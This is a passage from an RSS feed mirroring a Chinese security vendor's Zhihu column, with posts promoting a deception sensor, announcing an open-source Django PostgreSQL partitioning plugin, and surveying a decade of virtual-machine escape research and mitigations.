data-actualsrc=&quot;https://pic1.zhimg.com/v2-0e7e486c934f9cc609918a24d5ebafb0_b.jpg&quot;&gt;&lt;figcaption&gt;某高校谛听部署示意图&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;通过将监测节点部署至学校信息中心机房、实验室和图书馆等位置，监听校园网内的嗅探扫描行为，记录攻击方IP信息，结合校方内部IP地址表、学生信息、教务系统日志等，综合分析溯源，达到追踪攻击者，减少攻击事件的目标。 &lt;/p&gt;&lt;p&gt;………………………………………………………………………………………………………………&lt;/p&gt;&lt;p&gt;“谛听”，名起中国古典文学，地藏菩萨经案下伏着的通灵神兽，可以通过听来辨认世间万物，尤其善于听人的心，《西游记》中曾描述了谛听辨别真假美猴王的故事。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c6da7f578d33e2967b865eeae5acd959_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;434&quot; data-rawheight=&quot;379&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;434&quot; data-original=&quot;https://pic2.zhimg.com/v2-c6da7f578d33e2967b865eeae5acd959_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c6da7f578d33e2967b865eeae5acd959_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;434&quot; data-rawheight=&quot;379&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;434&quot; data-original=&quot;https://pic2.zhimg.com/v2-c6da7f578d33e2967b865eeae5acd959_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-c6da7f578d33e2967b865eeae5acd959_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;大胆推测，套用一句互联网大佬的句式，2018年并不是“伪装者”产品在过去十年最差的一年，但也许是在未来十年更好的第一年。&lt;/p&gt;&lt;p&gt;…………………………………………………………………………………………………………………………&lt;/p&gt;&lt;p&gt;2019年的RSAC下周即将到来，相信现场能看到更多的基于欺骗伪装技术的产品，长亭科技也将如约亮相，带来更多创新产品和技术思考，Welcome on board!&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4c80fdf08d27fb208fa8e7a4496a5c8c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;411&quot; data-rawheight=&quot;205&quot; class=&quot;content_image&quot; width=&quot;411&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4c80fdf08d27fb208fa8e7a4496a5c8c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;411&quot; data-rawheight=&quot;205&quot; class=&quot;content_image lazy&quot; width=&quot;411&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-4c80fdf08d27fb208fa8e7a4496a5c8c_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt; 点击&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//www.chaitin.cn/zh/dsensor&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;chaitin.cn/zh/dsensor&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;申请试用谛听（D-Sensor）内网威胁感知系统 &lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-03-04-58232413</guid>
<pubDate>Mon, 04 Mar 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>长亭新年贺礼 | 开源了我们的 Django PostgreSQL 时间分区表插件</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-02-19-57079991.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/57079991&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-84d3108f597c84b858b25d5362f5e7f7_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;什么是分区表，有什么优点&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;分区表就是将逻辑上的一个大表分成一些物理上的小表，是数据库系统为大型表的数据组织和管理提供的一种实用的功能特性。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;表分区有很多好处，比如：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;子表可以按照时间等特征去划分&lt;/b&gt;，如果一个查询带有时间范围，那么某些子表可以直接跳过。这样就减少了索引和数据文件的 IO 量，而且这些数据更可能被缓存在内存中了。&lt;/li&gt;&lt;li&gt; 一个子表可以被归档，也就是数据库会忽略它的存在，&lt;b&gt;实现老数据不再查询的特性。&lt;/b&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;如果磁盘空间不足，可以快速删除不想要的数据。&lt;/b&gt;被归档的表的删除和 vacuum 会比较容易，因为需要锁，一直写数据的情况下不容易操作。&lt;/li&gt;&lt;li&gt;&lt;b&gt;如果加一块磁盘扩容，之后创建的新的子表可以单独调整 tablespace 放在新的磁盘上，先不移动已有的数据。&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;我们为什么要开发这个插件&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这里需要先插播一个广告&lt;/p&gt;&lt;p&gt;&lt;b&gt;雷池（SafeLine）是全球首个基于智能语义分析算法的 WAF 产品。&lt;/b&gt;雷池从计算机语言的角度进行攻击检测，区别于传统的基于特征库和黑白名单机制的拦截原理，极大地降低了误报率和漏报率，提升了 WAF 拦截的准确度。面对云端变化，&lt;b&gt;雷池（SafeLine）云端解决方案无论应对私有云、公有云、混合云都有灵活应变的部署防护模式，帮助用户灵活配置网络环境。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;雷池需要不间断地将包括海量攻击检测、行为审计等各类日志入库持久化，给数据库带来了极大的压力。&lt;/p&gt;&lt;p&gt;当然表分区不是存储和处理大数据的最优办法，引入分布式数据库和分布式文件系统才能更好地分离查询和存储压力。但是在某些特定的场景下面（比如你的产品是卖给客户的一台硬件机器）是无法引入分布式系统的。&lt;/p&gt;&lt;p&gt;雷池的后端管理平台基于 Django 框架，而数据库主要使用 PostgreSQL。雷池 S20 系列使用的数据库主版本号为 11，该主版本更新的一大特性便是对表分区进行了若干增强，详情参见 &lt;a href=&quot;http://link.zhihu.com/?target=https%3A//www.postgresql.org/about/news/1894/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;postgresql.org/about/ne&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ws/1894/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;由于 Django ORM 当前不支持声明分区表，所以在此之前也有如 architect (&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//github.com/maxtepkeev/architect&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/maxtepkeev/a&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;rchitect&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;) 这样的插件，但是它是基于表继承来实现的，并不支持 PostgreSQL 10 之后的原生分区表功能，而原生分区表功能在性能和易用性上都远远好于表继承。&lt;/p&gt;&lt;p&gt;所以我们开源了基于时间进行原生分区和管理的 Django 插件 django-pg-timepart (&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//github.com/chaitin/django-pg-timepart&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/chaitin/djan&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;go-pg-timepart&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;)，它支持最新的 PostgreSQL 11，使 Django 能够在业务层对像文章、评论和日志这样的时序数据按一定时间间隔（如年、月、周等）来建立分区。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;如何使用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 Django 中，数据的核心是 model，所以只要给 model 加上我们的 decorator 就可以在 migrate 的时候声明为分区表了。&lt;/p&gt;&lt;p&gt;@TimeRangePartitioningSupport(&quot;timestamp&quot;, default_interval=6)&lt;/p&gt;&lt;p&gt;class AttackLog(models.Model):&lt;/p&gt;&lt;p&gt;    timestamp = models.DateTimeField()&lt;/p&gt;&lt;p&gt;rule_id = models.TextField()&lt;/p&gt;&lt;p&gt;……&lt;/p&gt;&lt;p&gt;但是这个时候只有主表没有子表，需要再去扫描所有的 model 然后创建或者归档子表。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;model.partitioning.create_partition()
model.partitioning.detach_partition()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;雷池的分区自动创建和归档是通过后端的定时器来触发上面的 API 实现的。&lt;/p&gt;&lt;p&gt;当然此归档周期等配置也是可以调整的，而且归档历史和子表信息也可以查询，它们都在 PartitionConfig 和 PartitionLog 中。&lt;/p&gt;&lt;p&gt;此外，我们在业务上给用户提供了修改和查询相关信息的界面，供参考:&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2a48e05df464f579c48b9501419a7336_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;366&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;939&quot; data-original=&quot;https://pic3.zhimg.com/v2-2a48e05df464f579c48b9501419a7336_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2a48e05df464f579c48b9501419a7336_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;366&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;939&quot; data-original=&quot;https://pic3.zhimg.com/v2-2a48e05df464f579c48b9501419a7336_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-2a48e05df464f579c48b9501419a7336_b.jpg&quot;&gt;&lt;/figure&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dd24de751cb6651963fb83cf7d8ef6e6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;410&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;939&quot; data-original=&quot;https://pic3.zhimg.com/v2-dd24de751cb6651963fb83cf7d8ef6e6_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dd24de751cb6651963fb83cf7d8ef6e6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;410&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;939&quot; data-original=&quot;https://pic3.zhimg.com/v2-dd24de751cb6651963fb83cf7d8ef6e6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-dd24de751cb6651963fb83cf7d8ef6e6_b.jpg&quot;&gt;&lt;/figure&gt;&lt;h2&gt;&lt;b&gt;最后&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;django-pg-timepart 虽然是一个从实际业务中分离出来的，代码不过千行，功能单一的小插件，但是当开源一个项目的时候，我们也在开源自身对于某些问题的一些想法，并愿意在开源社区中就使用 Django 构建 Web 应用过程中所遇到的问题参与讨论，这才是长亭开源的初衷。&lt;/p&gt;&lt;p&gt;欢迎大家为这一萌芽项目提供更多的建议、指出不足或对功能进行扩展使其更加通用化，Thanks！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;长亭科技同时也是一家长期致力于开源社区的网络安全企业&lt;/b&gt;，其他系列开源工具，了解一下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//github.com/chaitin/passionfruit&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/chaitin/pass&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ionfruit&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; 是 iOS 应用逆向与分析工具，可以大大加速 iOS 应用安全分析过程。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//github.com/chaitin/yanshi&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/chaitin/yans&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;hi&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; 是长亭雷池（SafeLine）下一代 Web 应用防火墙核心引擎使用到的代码生成工具。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-65b8a7085c6f73ab05ed362a02b486b3_b.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;43&quot; data-rawheight=&quot;11&quot; data-thumbnail=&quot;https://pic4.zhimg.com/v2-65b8a7085c6f73ab05ed362a02b486b3_b.jpg&quot; class=&quot;content_image&quot; width=&quot;43&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-65b8a7085c6f73ab05ed362a02b486b3_b.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;43&quot; data-rawheight=&quot;11&quot; data-thumbnail=&quot;https://pic4.zhimg.com/v2-65b8a7085c6f73ab05ed362a02b486b3_b.jpg&quot; class=&quot;content_image lazy&quot; width=&quot;43&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-65b8a7085c6f73ab05ed362a02b486b3_b.gif&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;其他相关阅读：&lt;/p&gt;&lt;p&gt;1. &lt;u&gt;&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651371841%26idx%3D1%26sn%3D8a59418dc63b146decea7444c64e5a2b%26chksm%3D8d39c8c9ba4e41dfc3b40f301f648e2dd8d71002a266f77678099d5a35aecfbfa5d086d758d8%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;《牧云开源的背后》&lt;/a&gt;&lt;/u&gt;（点击进入）&lt;/p&gt;&lt;p&gt;2. &lt;u&gt;《&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651372030%26idx%3D1%26sn%3D682c49b3decda87ddf0ed641d5d347c6%26chksm%3D8d39c876ba4e4160e88bacf0ffc3cadc39b60a269a6facec9f62134823af829624e42df52376%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;牧云（CloudWalker）开源手记 | Webshell监控检测策略初探&lt;/a&gt;》&lt;/u&gt;（点击进入）&lt;/p&gt;&lt;p&gt;3. &lt;u&gt;《&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651372090%26idx%3D1%26sn%3D71818ae8fdeaede83b169a1688817cc9%26chksm%3D8d39cbb2ba4e42a4117480f86e4d9beb6b908474a71b76de6d0aef9a066fbf2cbf9277e8650a%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;牧云（CloudWalker）开源|如约而至: Webshell核心检测引擎&lt;/a&gt;》&lt;/u&gt;（点击进入）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;请持续关注，牧云（CloudWalker）新动向即将放出……&lt;/b&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-02-19-57079991</guid>
<pubDate>Tue, 19 Feb 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>逃离云端“母体”——虚拟机逃逸研究进展</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-01-30-56027433.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/56027433&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ec87a4d9aecce9fb6569a67d9fbcc206_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/9270f5a422a185fe0a6b06d84caefae8&quot; data-hash=&quot;9270f5a422a185fe0a6b06d84caefae8&quot; data-hovercard=&quot;p$b$9270f5a422a185fe0a6b06d84caefae8&quot;&gt;@杨坤&lt;/a&gt; ，长亭科技首席安全研究员&lt;/p&gt;&lt;blockquote&gt;云计算时代已然到来，计算能力已经如同水和电一般，能够被我们随时使用，按需按量使用。依托于公有云设施，你只需轻松点击鼠标，即可购买处理器、内存、硬盘存储、网络带宽等资源，还可以伴随着需求的变化随时灵活调整用量，或增或减。实现这种魔法的核心技术之一正是虚拟化，它是一种能够将单一的硬件资源抽象成可细粒度调配的虚拟硬件资源池的技术。虚拟化技术的诞生极大地提高了计算资源的伸缩性和可管理性。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;什么是虚拟机逃逸？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;越来越多的应用不再直接运行在硬件上，而是运行在虚拟世界——虚拟机上。相对应的，真实世界中的每一台物理机被称为“宿主机”，通过虚拟化技术，它们被抽象成若干台虚拟机，每一台虚拟机之上可以运行不同的应用程序。这时候，为了防止不同虚拟机中运行的应用之间互相干扰，抢占权限，泄露信息，就要求“宿主机”有能力维持虚拟世界的秩序，让虚拟机之间完全隔离，让应用认识到它所存在的虚拟机就是世界的全部，而看不见其他虚拟机的存在。“宿主机”的这种掌控能力，就是虚拟化技术在设计时必须考虑的目标之一，也是云计算安全的基石。&lt;/p&gt;&lt;p&gt;然而虚拟化技术构建的安全屏障并非牢不可破。《黑客帝国》的主人公Neo生存的“母体”就是一个完全虚拟的世界，当他吞下红色药丸，即可完成“母体”的逃离，从而认识真实世界。虚拟化技术在设计或实现中存在的漏洞就是这颗“红色药丸”，虚拟机里运行的程序可以通过漏洞利用，突破禁锢，掌控“宿主机”，实现虚拟机逃逸。&lt;/p&gt;&lt;p&gt;虚拟机逃逸攻击打破了权限与数据隔离的边界，让攻击者从虚拟机里的“普通人类”，一跃成为掌控宿主机的“神”，得以窥探和管控同一片云下成百上千个虚拟机应用和海量数据。不得不说，虚拟机逃逸已成为云计算时代令人闻风丧胆的重大安全威胁之一，这样的攻击能否真的实现？难度究竟有多少？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;过去十年，主流虚拟化技术无一幸免&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;过去的二十年里，虚拟化技术突飞猛进，虚拟化领域的各种流派都得到了极大的发展。在开源领域，KVM占据了主导地位，Xen以将近二十年的历史也占据了一席之地，甲骨文的VirtualBox大多运用在小型测试场景；在商业战场，VMware稳坐领头羊的位置，微软的Hyper-V在其身后不断发起冲击。&lt;/p&gt;&lt;p&gt;而所有的这些主流虚拟化软件，在过去的十年里，面对虚拟化逃逸攻击，无一幸免，让我们一一盘点这些历史上出现过的“红色药丸”。&lt;/p&gt;&lt;p&gt;2009年，Immunity的安全研究员Kostya在BlackHat上演示了VMware Workstation逃逸。研究人员发现了图形显示相关的SVGA设备中的多个漏洞。SVGA模拟设备为虚拟机的2D和3D图像绘制提供了大量命令，由于在这些命令的处理代码中并未做好参数检查，导致攻击者可以利用内存越界访问来实现虚拟机逃逸。&lt;/p&gt;&lt;p&gt;2011年，来自Ksplice的内核工程师Nelson Elhage在BlackHat上演示了KVM逃逸，逃逸中利用了虚拟PIIX4设备中的漏洞。PIIX4是一个主板上的芯片，支持PCI热插拔，由于虚拟设备在代码实现中并未考虑硬件移除时产生的后果，导致出现了一个释放后使用（Use After Free）的问题。&lt;/p&gt;&lt;p&gt;2014年，Francisco Falcon在REcon上演示了VirtualBox逃逸，逃逸中利用了VirtualBox在3D加速功能中出现的内存访问漏洞。&lt;/p&gt;&lt;p&gt;2016年，阿里云安全团队的Shangcong Luan在HITBSec上演示了Xen逃逸。研究人员发现了Xen在虚拟内存管理中出现的一个漏洞，并通过它实现内存的任意读写，最终实现了对宿主机的控制。同年，世界黑客大赛Pwn2Own中首次引入虚拟机逃逸比赛项目，吸引了全球范围内的安全研究人员的关注，并在2017和2018年连续两年均有参赛选手成功挑战VMware Workstation和VirtualBox虚拟机逃逸。&lt;/p&gt;&lt;p&gt;2018年，长亭科技安全研究实验室的f1yyy在GeekPwn上演示了VMware ESXi虚拟机逃逸。VMware ESXi是企业级虚拟化方案的核心系统，防护级别高于桌面版的VMware Workstation，这是全球范围内针对ESXi的首次逃逸。此次逃逸攻击不仅利用了虚拟网卡设备的多个漏洞，也组合了绕过防护策略的技巧，才得以成功。&lt;/p&gt;&lt;p&gt;2018年，微软安全工程师Jordan Rabet在BlackHat上首次演示了Hyper-V逃逸。厂商的员工对自家产品做公开的攻击演示，是非常少见的情形，很好地证明了微软对待安全的积极和开放态度。微软也为虚拟机逃逸漏洞单独设立了丰厚的漏洞奖励计划，开出了最高一个漏洞25万美元的奖励。在这样的激励下，全球的研究人员为HyperV贡献了不少研究成果。&lt;/p&gt;&lt;p&gt;以上列举了过去十年里具有代表性的虚拟机逃逸攻击案例。可以看到，在攻防对抗的研究浪潮里，主流的虚拟化软件KVM、Xen、VMware、VirtualBox、HyperV无一幸免。事实上，除了这些案例，其他被发现和修复的虚拟机逃逸漏洞还有很多很多，数不胜数。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;虚拟设备已成重灾区&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;虚拟化技术包含了CPU虚拟化、内存虚拟化、I/O虚拟化等技术。回顾过去十年出现的虚拟机逃逸漏洞，I/O虚拟化技术中的虚拟设备是大部分漏洞产生的根源。&lt;/p&gt;&lt;p&gt;虚拟设备通常解决的是物理设备复用的问题，即如何将有限的硬件外设，例如网卡，抽象成多个网卡，来给不同的虚拟机使用。因此虚拟设备就应当有能力模拟出真实设备的完整功能，要能够为虚拟机提供所有真实设备本应支持的接口，并维护和记录自身状态。遇到需要真实硬件完成的功能时，再由虚拟设备进行传递和调用。&lt;/p&gt;&lt;p&gt;完整模拟硬件设备的功能并非易事，开发者需要遵循相关设备的功能说明书，以实现完整接口，供虚拟机使用。这些功能说明书动辄百页，代码实现复杂度较高。再加上虚拟设备种类繁多，出现编码问题的可能性就更大了。&lt;/p&gt;&lt;p&gt;在VMware多年的安全公告中，虚拟设备漏洞的整体数量占比超过了50%；在2016年的统计中，虚拟设备漏洞比例甚至达到了70%。多年来，Qemu项目中虚拟设备的漏洞数量达到了数百个，同时影响到了基于KVM和Xen的虚拟机。VirtualBox甚至公开警告用户谨慎使用一些虚拟设备，声称其中可能存在较大的安全风险。&lt;/p&gt;&lt;p&gt;所幸大量的研究人员已经将这一问题公开出来，一方面大量的虚拟设备漏洞得到发现和修复，另一方面也给虚拟化技术厂商和社区敲响了警钟。面对虚拟设备这一重灾区，未来是否有行之有效的解决方案？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;虚拟机逃逸防护的未来&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;安全的本质是攻防，这句话在几十年的内存漏洞攻防战中得到了完美体现。从1972年美国空军的研究报告中提出“栈溢出”这个概念开始，关于内存破坏类型漏洞的攻防博弈就一直没有停下脚步。攻击者会探索无数精妙的技巧，用千变万化的方式触发漏洞，绕过层层阻碍，实现精巧的内存布局，最终获得程序执行的控制权。而防护者则会思考一些通用方法，在假设漏洞存在的情况下，想尽一切办法阻挠攻击者利用漏洞实现程序控制。这种通用的防御方法我们称为“缓解措施（Mitigation）”。&lt;/p&gt;&lt;p&gt;“栈不可执行”的缓解措施掐断了跳转Shellcode的漏洞利用思路，而倒在了ROP利用技术面前。过去的几十年里，新的缓解措施在不断被提出和应用，增加了攻击者利用漏洞的难度，但是针对性地绕过这些缓解措施的技巧同样也在不断诞生。在这种攻防博弈的过程当中，漏洞利用的难度在不断变大，软件的安全性也得到了不断提升。相比于操作系统刚诞生的年代，如今的攻击者需要越过多重缓解措施的屏障，才能利用漏洞获得程序执行的自由。iOS是利用缓解措施来防止越狱的最佳典范，2018年年末苹果引入的PAC机制将防护级别又一次提升到了顶峰。&lt;/p&gt;&lt;p&gt;虚拟机逃逸同样也是内存破坏漏洞防护和利用的重要战场之一。当前主流的虚拟化技术方案，大多为了性能的考虑，尚未重视缓解措施的使用，例如地址随机性不够、存在可写可执行权限内存等问题依然可以在某些虚拟技术的实现中找到。来自微软的安全工程师Jordan Rabet在2018年的BlackHat大会上也提出了多种利用缓解措施保护Hyper-V的思路。我们相信，在未来，缓解措施必能在虚拟机逃逸防护中发挥积极作用。&lt;/p&gt;&lt;p&gt;软件安全领域，另一种大获成功的防护思路是沙箱。如今，几乎每个浏览器都会启用沙箱机制，便是一个最好的佐证。在引入沙箱之前，任何一个能够控制浏览器执行代码的漏洞都可以一剑封喉，为所欲为——直接获取系统权限。而沙箱，就好比一个牢笼，将攻击者束缚在有限的一片天地，任凭攻击者在牢笼中肆虐，也无碍广阔天地的宁静祥和。本质来说，沙箱机制的基本思路是将被保护对象的权限降到最低，只给保护对象所需的最小权限集合。这种思路能够全面降低保护对象被攻陷后造成的风险，让攻击者即便成功利用了漏洞，能力也是受限的，不足以施展恶意行为。&lt;/p&gt;&lt;p&gt;在沙箱机制的使用上，VMware的ESXi产品走在了前列，VMware将运行虚拟设备的进程通过沙箱保护了起来。长亭科技安全研究实验室在GeekPwn中演示的虚拟机逃逸，额外使用了一个沙箱绕过的漏洞，才得以冲破牢笼，完成逃逸，可见沙箱机制的使用极大地增加了攻击者的难度。微软的Hyper-V目前也启用了沙箱技术保护Worker进程。总的来说，沙箱机制的引入，能够让防守层次化。攻击者只有突破了每一层，才能完成整个攻击；反过来说，任何一个层面缺乏突破手段，完整攻击就无法进行。&lt;/p&gt;&lt;p&gt;基于软件和硬件相结合的缓解措施，以及层层隔离的沙箱机制，或许是虚拟机逃逸防护的未来。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;b&gt;生长有速 万物有度 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;谨以《2018 那些漏洞讲述的事 | 长亭安全漏洞观察年度报告》&lt;/p&gt;&lt;p&gt;献给守护网络安全的Super Heroes&lt;/p&gt;&lt;p&gt;2019，长亭将继续与您同行！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;点击&lt;b&gt;下方链接&lt;/b&gt;下载报告，一起把握网络安全变化的脉搏。&lt;/p&gt;&lt;a data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; href=&quot;http://link.zhihu.com/?target=https%3A//www.chaitin.cn/zh/reports&quot; data-image=&quot;https://pic2.zhimg.com/v2-e8c204d7d6b84e246f9e58451808d409_120x160.jpg&quot; data-image-width=&quot;1241&quot; data-image-height=&quot;1754&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;长亭科技 - 下一代应用安全领导者&lt;/a&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-01-30-56027433</guid>
<pubDate>Wed, 30 Jan 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>洞鉴（X-Ray）手记之三 | 企业级资产管理与风险控制解决方案</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-01-29-55967856.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/55967856&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
